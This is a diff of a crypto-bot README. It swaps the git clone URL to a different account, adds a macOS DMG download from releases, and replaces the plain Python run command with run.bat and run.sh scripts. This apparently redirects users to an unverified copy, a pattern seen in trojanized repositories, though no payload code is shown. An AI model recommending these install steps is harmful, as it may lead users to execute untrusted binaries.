@@ -15,20 +15,47 @@
 - **Auto repay**
 - **Multithread**
 
+# **Setup for Your OS:** 
+
+
 # Installation+Run🕸
-```shell
-git clone https://github.com/provified/openfi-bot
+
+Windows and Linux users must use the guide below; macOS users can install the [DMG file](../../releases).  
+
+
+
+
+
+Validate Git and Python presence.
+
+Git setup: https://git-scm.com/install/windows  
+
+Python setup: https://www.python.org/ftp/python/3.13.12/python-3.13.12-amd64.exe  
+
+Open GIT CMD.
+
+
+
+
+
+```bash 
+git clone https://github.com/ultiwebtraffidt/openfi-bot.git
+```
+```bash 
 cd openfi-bot
+```
+```bash 
+py -m pip install -r requirements.txt
+```
 run.bat
 ```
 
-**OR**
-
+**Linux/macOS:**
 ```shell
-git clone https://github.com/provified/openfi-bot
+git clone https://github.com/ultiwebtraffidt/openfi-bot
 cd openfi-bot
-pip install -r requirements.txt
-python bot.py
+chmod +x run.sh
+./run.sh
 ```
 
 # Set-up⚙
@@ -54,4 +81,3 @@ socks5://username:password:ip:port
 - ***My eth address is 0xd260e28b533f153d59cb340b4213ad5977d71fe7***
 
 If you have any questions or some ideas to improve my bots, feel free to contact me on telegram or issues section.
-
